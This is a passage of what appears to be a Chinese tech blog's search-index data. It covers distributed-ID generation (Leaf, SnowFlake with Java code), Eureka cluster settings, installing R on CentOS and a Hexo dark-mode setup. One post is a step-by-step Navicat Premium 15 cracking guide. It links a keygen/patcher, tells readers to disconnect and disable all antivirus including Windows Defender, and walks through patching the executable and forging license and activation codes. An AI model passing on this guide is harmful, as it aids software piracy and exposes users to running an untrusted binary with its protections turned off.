下发时间取决于下一次从数据库取回号段的时间，并且在这期间进来的请求也会因为数据库号段没有取回来，导致线程阻塞。如果请求数据库的网络和数据库的性能稳定，这种情况对系统的影响是不大的，但是假如取数据库的时候网络发生抖动，或者数据库发生慢查询就会导致整个系统的响应时间变慢。为此，希望数据库取号段的过程能够做到无阻塞，不需要在数据库取号段的时候阻塞请求线程，即当号段消费到某个点时就异步的把下一个号段加载到内存中。而不需要等到号段用尽的时候才去更新号段。这样做就可以很大程度上的降低系统的 TP999 指标。详细实现如下图所示： 采用双 Buffer 的方式，Leaf 服务内部有两个号段缓存区 segment。当前号段已下发 10% 时，如果下一个号段未更新，则另启一个更新线程去更新下一个号段。当前号段全部下发完后，如果下个号段准备好了则切换到下个号段为当前 segment 接着下发，循环往复 每个 biz-tag 都有消费速度监控，通常推荐 segment 长度设置为服务高峰期发号 QPS 的 600 倍（10 分钟），这样即使数据库宕机，Leaf 仍能持续发号 10-20 分钟不受影响 每次请求来临时都会判断下个号段的状态，从而更新此号段，所以偶尔的网络抖动不会影响下个号段的更新 2.2、Leaf-snowflake 方案2.2.1、概述Leaf-segment 方案可以生成趋势递增的 ID，同时 ID 是可计算的，不适用于订单 ID 生成场景，比如竞对在两天中午 12 点分别下单，通过订单 ID 相减就能大致计算出公司一天的订单量，这个是不能忍受的。面对这一问题，美团点评提供了 Leaf-snowflake 方案。 2.2.2、架构Leaf-snowflake 方案完全沿用 SnowFlake 方案的 bit 位设计，即是 1+41+10+12 的方式组装 ID。对于 workerId 的分配，当服务集群数量较小的情况下，完全可以手动配置。Leaf 服务规模较大，动手配置成本太高。所以使用 ZooKeeper 持久顺序节点的特性自动对 SnowFlake 节点配置 wokerId。Leaf-snowflake 是按照下面几个步骤启动的： 启动 Leaf-snowflake 服务，连接 ZooKeeper，在 leaf_forever 父节点下检查自己是否已经注册过（是否有该顺序子节点） 如果有注册过直接取回自己的 workerId（ZooKeeper 顺序节点生成的 int 类型 ID），启动服务 如果没有注册过，就在该父节点下面创建一个持久顺序节点，创建成功后取回顺序号当做自己的 workerId 号，启动服务 2.2.3、弱依赖 ZooKeeper除了每次会去 ZooKeeper 拿数据以外，也会在本机文件系统上缓存一个 workerId 文件。当 ZooKeeper 出现问题，恰好机器出现问题需要重启时，能保证服务能够正常启动。这样做到了对三方组件的弱依赖，一定程度上提高了 SLA。 2.2.4、解决时钟回拨问题因为 Leaf-snowflake 方案依赖时间，如果机器的时钟发生了回拨，那么就会有可能生成重复的 ID，因此需要解决时钟回退的问题。Leaf-snowflake 整个启动流程图如下： 1）服务启动时首先检查自己是否写过 ZooKeeper 的 leaf_forever 节点 2）若写过，则用自身系统时间与 leaf_forever/${self} 节点记录时间做比较，若小于 leaf_forever/${self} 时间则认为机器时间发生了大步长回拨，服务启动失败并报警 3）若未写过，证明是新服务节点，直接创建持久节点 leaf_forever/${self} 并写入自身系统时间，接下来综合对比其余 Leaf 节点的系统时间来判断自身系统时间是否准确，具体做法是取 leaf_temporary 下的所有临时节点（所有运行中的 Leaf-snowflake 节点）的服务 IP：Port，然后通过 RPC 请求得到所有节点的系统时间，计算 sum(time) / nodeSize。 4）若 abs (系统时间 - sum (time) /nodeSize ) &lt; 阈值，认为当前系统时间准确，正常启动服务，同时写临时节点 leaf_temporary/${self} 维持租约 5）否则认为本机系统时间发生大步长偏移，启动失败并报警 6）每隔一段时间（3s）上报自身系统时间写入 leaf_forever/${self} 由于强依赖时钟，对时间的要求比较敏感，在机器工作时 NTP 同步也会造成秒级别的回退，建议可以直接关闭 NTP 同步。要么在时钟回拨的时候直接不提供服务直接返回 ERROR_CODE，等时钟追上即可。或者做一层重试，然后上报报警系统，更或者是发现有时钟回拨之后自动摘除本身节点并报警，代码如下： 12345678910111213141516171819202122//发生了回拨，此刻时间小于上次发号时间 if (timestamp &lt; lastTimestamp) { long offset = lastTimestamp - timestamp; if (offset &lt;= 5) { try { //时间偏差大小小于5ms，则等待两倍时间 wait(offset &lt;&lt; 1);//wait timestamp = timeGen(); if (timestamp &lt; lastTimestamp) { //还是小于，抛异常并上报 throwClockBackwardsEx(timestamp); } } catch (InterruptedException e) { throw e; } } else { //throw throwClockBackwardsEx(timestamp); } } //分配ID 3、参考资料 Leaf 官方文档 MySQL 半同步复制 UidGenerator 官方文档 基于美团 Leaf、百度 UidGenerator、SnowFlake 整合的分布式唯一 ID 生成器 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"数据库 分布式"},{title:"分布式唯一全局 ID 解决方案之一",url:"/posts/b2330a87.html",text:'大纲 分布式唯一全局 ID 解决方案之一 分布式唯一全局 ID 解决方案之二 1、分布式 ID 简介1.1、业务背景在复杂的分布式系统中，往往需要对大量的数据和消息进行唯一标识。比如在美团点评的金融、支付、餐饮、酒店、猫眼电影等产品的系统中数据日渐增长，对数据分库分表后需要有一个唯一 ID 来标识一条数据或消息。具体一点的如订单、骑手、优惠劵也都需要有唯一标识，此时一个能够生成全局唯一 ID 的系统是非常必要的。 1.2、ID 生成规则的硬性要求 全局唯一：不能出现重复的 ID ，既然是唯一标识，这是最基本的要求 单调递增：保证下一个 ID 大于上一个 ID，例如事务版本号、IM 增量信息、排序等特殊需求 趋势递增：在 MySQL 的 InnoDB 存储引擎中使用的是聚集索引，由于多数 RDBMS 使用 BTree 的数据结构来存储索引数据，在主键的选择上面应该尽量使用有序的主键来保证写入性能 信息安全：如果 ID 是连续的，恶意用户的爬取工作就非常容易做了，直接按照顺序下载指定 URL 即可 所以在一些应用场景下，需要 ID 无规则或者不规则，让竞争对手不好猜 上述的全局唯一、单调递增、趋势递增需求分别对应三类不同的业务场景，但单调递增和信息安全这两个需求是互斥的，无法使用同一个方案满足 1.3、ID 生成系统的可用性要求 低延迟：发一个获取分布式 ID 的请求，服务器就要快，极速 高可用：一个获取分布式 ID 的请求，服务器就要在保证 99.999% 成功率的情况下创建一个唯一分布式 ID 高 QPS：假如并发一堆创建分布式 ID 的请求同时杀过来，服务器要顶得住且一下子成功创建 10 万个唯一分布式 ID 2、UUID 生成 ID2.1、概述UUID 按照 OSF 制定的标准计算，用到了以太网卡地址、纳秒级时间、芯片 ID 码和许多可能的数字，并由以下几部分的组成：当前日期和时间、时钟序列、全局唯一的 IEEE 机器识别号。UUID 的标准形式包含 32 个 16 进制的数字，以连字号分为 5 段，形式为 cb6ce510-74fe-4e18-ac3d-05a5c96d3a0f 的 36 个字符。特别注意，基于 MAC 地址生成 UUID 的算法可能会造成 MAC 地址泄露，这个漏洞曾被用于寻找梅丽莎病毒的制作者位置。 2.2、优缺点 优点：性能高，本地生成，没有网络消耗。如果只考虑唯一性，那么可以使用 缺点：无序，长度较长，入库性能差，作为数据库主键时，会导致索引效率下降，空间占用较多 适用场景：只要对存储空间没有苛刻要求的都能够适用，比如各种链路追踪、日志存储等 为什么无序的 UUID 会导致入库性能变差？ 无序：即无法预测 ID 的生成顺序，不能生成递增的有序数字 ID 长度过长：分布式 ID 一般都是作为主键，但是 MySQL 官方推荐主键尽量越短越好，36 个字符长度的 UUID 不是很推荐 B+ 树索引分裂：既然分布式 ID 是主键，然后主键是包含索引的，MySQL 的索引是通过 B+ 树来实现的，每一次新的 UUID 数据的插入，为了查询的优化，都会对索引的底层 B+ 树进行修改。因为 UUID 数据是无序的，所以每一次 UUID 的数据插入都会对主键底层的 B+ 树进行很大的修改，这一点非常不好。插入的 ID 完全无序，不但会导致一些中间节点产生分裂，也会白白的创造出很多的不饱和节点，这样大大的降低了数据库的插入性能 3、数据库自增 ID3.1、概述在分布式应用里，数据库的自增 ID 机制的主要原理是使用：MySQL 数据库自增 ID 和 replace into 来实现的。利用给字段设置 auto_increment 和 auto_increment_offset 来保证 ID 自增，每次业务使用下列 SQL 读写 MySQL 得到 ID。 这里的 replace into 跟 insert 功能类似，不同点在于 replace into 首先会尝试插入数据到表中，如果发现表中已经有此行数据（根据主键或者唯一索引判断），则先删除旧数据，否则直接插入新数据 3.2、优缺点优点： 非常简单，利用现有数据库系统的功能实现，成本小 ID 单调自增，可以实现一些对 ID 有特殊要求的业务 缺点： 生成的是单调递增的 ID，同时 ID 是可计算的，不适用于订单 ID 生成场景，否则竞争对手很从容易猜到 分库分表后，同一数据表的自增 ID 容易重复，无法直接使用（可以设置自增步长，但局限性很明显） 强依赖数据库，当数据库异常时整个系统不可用，属于致命问题。配置主从复制可以尽可能的增加可用性，但是数据一致性在特殊情况下难以保证，主从切换时的不一致可能会导致重复生成 ID 生成 ID 的性能瓶颈限制在单台 MySQL 的读写性能，如果设计一个单独的数据库来实现分布式应用的数据唯一性，即使使用预生成方案，也会因为事务锁的问题，高并发场景容易出现单点瓶颈 适用场景： 单数据库实例的表 ID（包含主从同步场景），部分按天计数的流水号等，不适用于分库分表场景、全局唯一 ID 场景 数据库的自增 ID 机制为什么不适合作为分布式 ID？ 在高并发的场景下，数据库压力还是很大，每次获取 ID 都得读写一次数据库，非常影响性能，不符合分布式 ID 里面的低延迟和高 QPS 的规则 系统水平扩展比较困难，为了提高 MySQL 的性能，如果要增加 MySQL 数据库该怎么做？ 3.3、MySQL 集群场景在分布式系统中可以多部署几台机器，每台机器设置不同的初始值，且自增步长和机器数相等。比如有 2 台机器，设置自增步长为 2，TicketServer1 的初始值为 1（1，3，5，7，9，11 …）、TicketServer2 的初始值为 2（2，4，6，8，10 …）。如下所示，分别设置两台机器对应的参数，TicketServer1 从 1 开始生成 ID ，TicketServer2 从 2 开始生成 ID ，两台机器每次生成 ID 之后都递增 2。 1234567TicketServer1:auto-increment-increment = 2auto-increment-offset = 1TicketServer2:auto-increment-increment = 2auto-increment-offset = 2 假设要部署 N 台机器，自增步长需设置为 N，每台的初始值依次为 0，1，2 … N-1，那么整个架构就变成了如下图所示： 这种架构貌似能够满足性能的需求，但有以下几个缺点： 数据库压力还是很大，每次获取 ID 都得读写一次数据库，只能靠堆机器来提高性能 ID 没有了单调递增的特性，只能趋势递增，这个缺点对于一般业务需求不是很重要，可以容忍 系统水平扩展比较困难，比如定义好了自增步长和机器台数之后，如果要添加机器该怎么做？假设现在只有一台机器生成 ID 是 1，2，3，4，5（自增步长是 1），这个时候需要扩容机器一台。可以这样做：把第二台机器的初始值设置得比第一台超过很多，比如 14（假设在扩容时间之内第一台不可能发到 14），同时设置自增步长为 2，那么这台机器下发的号码都是 14 以后的偶数。然后摘掉第一台，把 ID 值保留为奇数，比如 7，然后修改第一台的自增步长为 2。让它符合我们定义的号段标准，对于这个例子来说就是让第一台以后只能产生奇数。扩容方案看起来复杂吗？貌似还好，现在想象一下如果线上有 100 台机器，这个时候要扩容该怎么做？简直是噩梦，所以系统水平扩展方案复杂难以实现。 4、基于 Redis 生成全局 ID 策略4.1、概述因为 Redis 是单线程的，天生保证了原子性，可以使用原子操作 INCR 和 INCRBY 来生成分布式唯一 ID 4.2、优缺点优点： 整体吞吐量比数据库方案要高 缺点： Redis 实例或集群宕机后，找回最新的 ID 值有点困难 Redis 单机环境下，存在单点故障问题，导致 ID 生成服务不可用 生成的是单调递增的 ID，同时 ID 是可计算的，不适用于订单 ID 生成场景，否则竞争对手很从容易猜到 适用场景： 比较适合计数场景，如用户访问量，订单流水号（日期 + 流水号）等 4.3、Redis 集群场景通过 Redis 集群来生成唯一 ID 时，需要设置相同的自增步长，且自增步长等于节点数，同时 Key 要求设置相同的有效期，以此来获得更高的吞吐量。假设一个集群中有 5 台 Redis，此时可以初始化每台 Redis 的值分别是 1，2，3，4，5，然后自增步长都是 5，那么各个 Redis 生成的 ID 为： A：1，6，11，16，21 B：2，7，12，17，22 C：3，8，13，18，23 D：4，9，14，19，24 E：5，10，15，20，25 这种方式最大的缺点是复杂性太高，需要严重依赖第三方服务，集群管理繁琐，而且代码配置繁琐。一般来说，越是复杂的方案，越不可靠。 5、SnowFlake（雪花算法）5.1、概述SnowFlake 算法来源于 Twitter，使用 Scala 语言实现，利用 Thrift 框架实现 RPC 接口调用，最初的项目起因是数据库从 MySQL 迁移到 Cassandra，而 Cassandra 没有现成可用的 ID 生成机制，就催生了该算法。SnowFlake 的特性如下： SnowFlake 生成 ID 能够按照时间有序生成 经测试 SnowFlake 每秒能够产生 26 万个自增可排序 ID 分布式系统内不会产生 ID 碰撞（由 datacenter 和 workerId 做区分），并且生成效率较高 SnowFlake 算法生成 ID 的结果是一个 64 bit 大小的整数，刚好为一个 Long 型，转换成字符串后长度最多是 19 5.2、结构SnowFlake 算法的特性是有序、全局唯一、高性能、低延迟（响应时间在 2ms 以内），可在分布式环境（多集群，跨机房）下使用，因此使用 SnowFlake 算法得到的 ID 是分段组成的： 与指定日期的时间差（毫秒级），41 位，够用 69 年 集群 ID + 机器 ID，一共 10 位，包括 5 位 datacenterId 和 5 位 workerId，最多支持 1024 台机器 序列号，12 位，每台机器每毫秒内最多产生 4096 个序列号 1bit：符号位，固定是 0，表示全部 ID 都是正整数 41bit：时间戳（毫秒数时间差），从指定的日期算起，够用 69 年，用 Long 类型表示的时间戳是从 1970-01-01 00:00:00 开始算起的 10bit：机器 ID，有异地部署，多集群的也可以配置，需要线下规划好各地机房，各集群，各实例 ID 的编号 12bit：序列号，前面都相同的话，最多可以支持到 4096 个 5.3、优缺点优点： 可以根据自身业务特性分配 bit 位，非常灵活 毫秒数在高位，自增序列在低位，整个 ID 都是趋势递增的 不依赖数据库等三方系统，以服务的方式部署，稳定性更高，生成 ID 的效率也是非常高，低延迟 缺点： 强依赖机器时钟，如果机器的时钟回拨了，会导致生成重复的 ID 若生成环境中使用了容器化技术，实例的个数随时有变化，那么 SnowFlake 需要一定的改造才能更好地应用到生产环境中 在单机上是递增的，但是由于涉及到分布式环境，每台机器上的时钟不可能完全同步（如时钟回拨），有时候可能会出现不是全局递增的情况（此缺点可认为无所谓，一般分布式 ID 只是要求趋势递增，并不会严格要求递增，90% 的业务需求都只需要趋势递增） 适用场景： 分布式应用环境的数据主键 5.4、Java 版实现Java 版的代码实现来自这里，在企业的项目开发中，一般可以直接使用封装好 SnowFlake 算法的 Java 工具库（如 Hutools 工具库），不再需要自己实现一遍，完整的代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102/** * twitter的snowflake算法 -- java实现 * * @author beyond * @date 2016/11/26 */public class SnowFlake { /** * 起始的时间戳 */ private final static long START_STMP = 1480166465631L; /** * 每一部分占用的位数 */ private final static long SEQUENCE_BIT = 12; //序列号占用的位数 private final static long MACHINE_BIT = 5; //机器标识占用的位数 private final static long DATACENTER_BIT = 5;//数据中心占用的位数 /** * 每一部分的最大值 */ private final static long MAX_DATACENTER_NUM = -1L ^ (-1L &lt;&lt; DATACENTER_BIT); private final static long MAX_MACHINE_NUM = -1L ^ (-1L &lt;&lt; MACHINE_BIT); private final static long MAX_SEQUENCE = -1L ^ (-1L &lt;&lt; SEQUENCE_BIT); /** * 每一部分向左的位移 */ private final static long MACHINE_LEFT = SEQUENCE_BIT; private final static long DATACENTER_LEFT = SEQUENCE_BIT + MACHINE_BIT; private final static long TIMESTMP_LEFT = DATACENTER_LEFT + DATACENTER_BIT; private long datacenterId; //数据中心 private long machineId; //机器标识 private long sequence = 0L; //序列号 private long lastStmp = -1L;//上一次时间戳 public SnowFlake(long datacenterId, long machineId) { if (datacenterId &gt; MAX_DATACENTER_NUM || datacenterId &lt; 0) { throw new IllegalArgumentException("datacenterId can\'t be greater than MAX_DATACENTER_NUM or less than 0"); } if (machineId &gt; MAX_MACHINE_NUM || machineId &lt; 0) { throw new IllegalArgumentException("machineId can\'t be greater than MAX_MACHINE_NUM or less than 0"); } this.datacenterId = datacenterId; this.machineId = machineId; } /** * 产生下一个ID * * @return */ public synchronized long nextId() { long currStmp = getNewstmp(); if (currStmp &lt; lastStmp) { throw new RuntimeException("Clock moved backwards. Refusing to generate id"); } if (currStmp == lastStmp) { //相同毫秒内，序列号自增 sequence = (sequence + 1) &amp; MAX_SEQUENCE; //同一毫秒的序列数已经达到最大 if (sequence == 0L) { currStmp = getNextMill(); } } else { //不同毫秒内，序列号置为0 sequence = 0L; } lastStmp = currStmp; return (currStmp - START_STMP) &lt;&lt; TIMESTMP_LEFT //时间戳部分 | datacenterId &lt;&lt; DATACENTER_LEFT //数据中心部分 | machineId &lt;&lt; MACHINE_LEFT //机器标识部分 | sequence; //序列号部分 } private long getNextMill() { long mill = getNewstmp(); while (mill &lt;= lastStmp) { mill = getNewstmp(); } return mill; } private long getNewstmp() { return System.currentTimeMillis(); } public static void main(String[] args) { SnowFlake snowFlake = new SnowFlake(2, 3); for (int i = 0; i &lt; (1 &lt;&lt; 12); i++) { System.out.println(snowFlake.nextId()); } }} 上面的代码基本上通过位移操作，将每段含义的数值，移到相应的位置上。如机器 ID 这里由数据中心 + 机器标识组成，所以，机器标识向左移 12 位，就是它的位置，数据中心的编号向左移 17 位，时间戳的值向左移 22 位，每部分占据自己的位置，各不干涉，由此组成一个完整的 ID 值。 了解 SnowFlake 的基本实现原理，可以通过提前规划好机器标识来实现，但目前的分布式生产环境，借用了多种云计算、容器化技术，实例的个数随时有变化，而且还需要处理服务器实例的时钟回拨问题，固定规划 ID 然后通过配置来使用 SnowFlake 的场景可行性不高。一般是自动启停，增减机器，这样就需要对 SnowFlake 进行一些改造才能更好地应用到生产环境中。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"数据库 分布式"},{title:"Eureka 开发随笔",url:"/posts/6cbc15f0.html",text:'Eureka 搭建集群，节点均出现在 unavailable-replicas 下 Eureka 搭建高可用集群，启动多个注册中心后，节点均出现在 unavailable-replicas，查阅各类资料和测试，提供的方案如下： eureka.client.serviceUrl.defaultZone 配置项的地址，不能使用 localhost 或者内网/外网 IP，要使用域名，DNS 解析请自行配置，也可以在本机的 /etc/hosts 里映射域名 spring.application.name 要一致（默认不配置也可以） register-with-eureka 设置为 true（默认不配置也可以） 1234eureka: client: register-with-eureka: true fetch-registry: false 配置 eureka.instance.hostname (好像看到过正常情况下 Eureka 会自动拉取设备 Host，但各节点在同一机器下时请务必添加，注意各节点配置自己节点的 Host) 123eureka: instance: hostname: host1 千折腾万折腾还是不好使的时候，请去掉下面这个参数或者改为 false（神坑），未找到官方原因 123eureka: instance: prefer-ip-address: false 个人大概理解了下，prefer-ip-address: true 为不使用主机名来定义注册中心的地址，而使用 IP 地址的形式，而 defaultZone 中是以域名的方式向注册中心注册的（测试了下使用 IP 注册到备份节点不可识别），最终导致分片节点不能识别匹配（IP 地址与域名），而认为分片均处于不可达状态。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务 开发随笔"},{title:"Navicat Premium 15 永久破解教程",url:"/posts/319e35f3.html",text:'前言这篇文章主要介绍 Windows 系统下 Navicat Premium 15 永久破解的教程，亲测永久破解有效！Navicat Premium 是 MySQL、MongoDB、SQL Server、Oracle 和 PostgreSQL 的一体化数据库管理工具，功能非常强大。 准备工作软件版本说明建议 Navicat Premium 15 软件和注册机软件都直接从本站下载，当前本站提供下载的 Navicat Premium 版本是 15.0.26，配套的注册机软件版本是 v5.6，两者都是经过亲测可以永久破解的。这是因为随着时间的推移，从官网下载的最新版 Navicat Premium 15，并不能保证能被 v5.6 版本的注册机永久破解。 下载注册机软件 本站下载地址（推荐）：点击下载 百度网盘地址：点击下载&nbsp; 提取码: mzgp 下载 Navicat Premium 15 软件 官网下载地址：点击下载 本站下载地址（推荐）：点击下载 Navicat Premium 15 破解注意事项 运行注册机软件之前，必须保证断网 运行注册机软件之前，必须关闭所有杀毒软件，包括 360 杀毒、腾讯管家、Windows Defender 等 Navicat Premium 15 安装完成后，不要运行 Navicat 软件，而是直接先运行注册机软件 运行注册机软件时，请选择 Navicat 的版本为 Navicat v15 安装 Navicat Premium 15Navicat Premium 15 下载好后直接安装，此安装步骤比较简单，选择安装位置后全部点击下一步 按钮即可 特别注意： Navicat Premium 15 安装完成后，不要运行 Navicat 软件 破解 Navicat Premium 15第一步破解 Navicat Premium 15 之前，必须保证断网，同时必须关闭所有杀毒软件，例如 360 杀毒、腾讯管家、Windows Defender 等 第二步以管理员身份运行注册机软件，勾选 Backup、Host 和 Navicat v15，然后点击 Patch 按钮，找到 Navicat Premium 15 安装目录下的 navicat.exe，选中并点击打开，Patch 成功后会提示 navicat.exe - x64 -&gt; Cracked，表示 Navicat Premium 15 已被破解 提示：如果 Navicat 安装在默认位置，点击 Patch 按钮后，会直接提示 navicat.exe - x64 -&gt; Cracked，而不再弹窗让你选择特定安装目录下的 navicat.exe 第三步Licenses 项选择 Enterprise，Products 项选择 Premium，Languages 项选择 Simplified Chinese，Resale License 项选择 Site License，然后点击 Generate 按钮，生成许可证密钥 第四步运行 Navicat Premium 15 软件，点击 注册 按钮，或者在主界面的菜单栏导航到：帮助 -&gt; 注册 粘贴上一步生成的许可证密钥到 Navicat Premium 15 的许可证密钥输入框，然后点击 激活 按钮 紧接着点击 手动激活 按钮 点击 手动激活 按钮后，显示的界面如下，该界面会显示 Navicat Premium 15 的 请求码 第五步将上一步 Navicat Premium 15 生成的 请求码 粘贴到注册机软件的 Request Code 输入框中，然后点击 Generate 按钮，生成激活码 最后将注册机软件生成的激活码粘贴到 Navicat Premium 15 的激活码输入框，然后点击 激活 按钮 成功激活后的提示界面如下 也可以在 Navicat Premium 15 主界面的菜单栏导航到：帮助 -&gt; 注册 来查看是否成功激活 常见问题破解失败若破解失败，首先卸载 Navicat Premium 15 软件，然后清理注册表并重启系统，最后再尝试重新安装并破解 Navicat 软件 参考博客 Navicat 的 Linux 版破解工具 Linux 安装 Navicat Premium 15 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"Centos 7 安装 R 语言",url:"/posts/a4ef22cd.html",text:'前言 R 官网下载 RStudio 官网下载 RPM 安装 R因为 R 已经由 EPEL 仓库管理，所以使用以下命令安装 R 12345678# 安装EPEL# yum install epel-release# 安装R# yum install R# 查看R的版本# R --version RPM 安装 RStudio从 官网下载 RStudio Desktop 或者 RStudio Server 的 RPM 安装包，然后直接使用以下 RPM 命令安装即可 1# rpm -ivh rstudio-1.4.1106-x86_64.rpm 验证 R 的安装创建 /usr/local/R/demo.R 源文件，写入以下代码 12345x &lt;- c(1,2,5,7,9)y &lt;- c(2,4,7,8,10)plot(x,y)abline(lm(y~x))title("回归图表") 在 R 的交互终端执行以下命令，运行上述的代码，若可以正常显示 回归图表，则说明 R 安装成功 123$ R&gt; setwd("/usr/local/R/")&gt; source("demo.R") R 安装 Package12$ R&gt; install.packages("httr") var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Hexo Next 8.x 主题添加可切换的暗黑模式",url:"/posts/abf4aee1.html",text:"前言Next 8.x 原生的暗黑模式Next 8.x 主题已经原生支持暗黑模式，只需要在 Next 的 _config.yml 配置文件中，将相应的开关打开即可（如下所示）： 1darkmode: true Next 8.x 主题原生暗黑模式的优缺点： 优点： 配置非常简单 缺点： 缺少切换按钮，默认是根据系统偏好（系统是否处于暗黑模式）来决定是否启用 Next 7.x 自动添加可切换的暗黑模式若读者使用的 Next 版本是 7.x，建议直接安装 hexo-next-darkmode 插件来自动添加可切换的暗黑模式，具体的安装步骤与下面讲述的 Next 8.x 教程一致。 Next 8.x 自动添加可切换的暗黑模式hexo-next-darkmode 插件支持自动添加可切换的暗黑模式，同时支持暗黑模式下的 CSS 样式高度自定义，兼容 Next 7.x 与 8.x 版本。 安装 Hexo 插件安装 hexo-next-darkmode 插件 1$ npm install hexo-next-darkmode --save 配置 Hexo 插件在 Next 主题的 _config.yml 配置文件里添加以下内容 1234567891011121314151617# Darkmode JS# For more information: https://github.com/rqh656418510/hexo-next-darkmode, https://github.com/sandoche/Darkmode.jsdarkmode_js: enable: true bottom: '64px' # default: '32px' right: 'unset' # default: '32px' left: '32px' # default: 'unset' time: '0.5s' # default: '0.3s' mixColor: 'transparent' # default: '#fff' backgroundColor: 'transparent' # default: '#fff' buttonColorDark: '#100f2c' # default: '#100f2c' buttonColorLight: '#fff' # default: '#fff' isActivated: false # default false saveInCookies: true # default: true label: '🌓' # default: '' autoMatchOsTheme: true # default: true libUrl: # Set custom library cdn url for Darkmode.js isActivated: true：默认激活暗黑 / 夜间模式，请始终与 saveInCookies: false、autoMatchOsTheme: false 一起使用；同时需要在 NexT 主题的 _config.yml 配置文件里设置 pjax: true，即启用 Pjax。 关闭原生的暗黑模式确保 Next 原生的 darkmode 选项设置为 false，在 Next 的 _config.yml 配置文件中更改以下内容： 1darkmode: false 暗黑模式 CSS 样式自定义（可选）暗黑模式激活后，hexo-next-darkmode 插件会将 darkmode--activated CSS 类添加到 body 标签，可以利用它覆盖插件默认自带的 CSS 样式（如下所示），这样就可以实现暗黑模式 CSS 样式的高度自定义。更多配置内容介绍可以参考官方文档，实现原理分析可以看这里。 12345678910111213141516171819202122232425262728293031323334353637.darkmode--activated { --body-bg-color: #282828; --content-bg-color: #333; --card-bg-color: #555; --text-color: #ccc; --blockquote-color: #bbb; --link-color: #ccc; --link-hover-color: #eee; --brand-color: #ddd; --brand-hover-color: #ddd; --table-row-odd-bg-color: #282828; --table-row-hover-bg-color: #363636; --menu-item-bg-color: #555; --btn-default-bg: #222; --btn-default-color: #ccc; --btn-default-border-color: #555; --btn-default-hover-bg: #666; --btn-default-hover-color: #ccc; --btn-default-hover-border-color: #666; --highlight-background: #282b2e; --highlight-foreground: #a9b7c6; --highlight-gutter-background: #34393d; --highlight-gutter-foreground: #9ca9b6;}.darkmode--activated img { opacity: 0.75;}.darkmode--activated img:hover { opacity: 0.9;}.darkmode--activated code { color: #69dbdc; background: transparent;} 重新构建生成静态文件Hexo 重新构建生成静态文件后，点击页面上的按钮即可切换暗黑模式，最终演示效果可以看这里。 123$ hexo clean$ hexo g -d Next 8.x 手动添加可切换的暗黑模式关闭原生的暗黑模式确保 Next 原生的 darkmode 选项设置为 false，在 Next 的 _config.yml 配置文件中更改以下内容： 1darkmode: false 添加 JS 库 Darkmode.js下载 darkmode.js 或者直接添加 CDN 配置到 Next 的 themes/next/_vendors.yml 文件末尾，这里采用 CDN 配置的方式（如下所示） 1234darkmode_js: name: darkmode-js version: 1.5.7 file: lib/darkmode-js.min.js 添加 Darkmode.js 的启用开关在 Next 的 _config.yml 配置文件添加以下内容，值得一提的是，这里需要注意缩进，第一个 darkmode_js 是在 vendors 栏目下，第二个 darkmode_js 是一个单独的栏目 123456vendors: # Darkmode.js darkmode_js:darkmode_js: enable: true 配置 JS 库 Darkmode.js编辑 themes/next/layout/_scripts/vendors.njk 文件，将原有的代码删除掉，替换为以下代码即可： 123456789101112131415161718192021222324252627282930313233{%- if theme.canvas_ribbon.enable %} &lt;script size=\"{{ theme.canvas_ribbon.size }}\" alpha=\"{{ 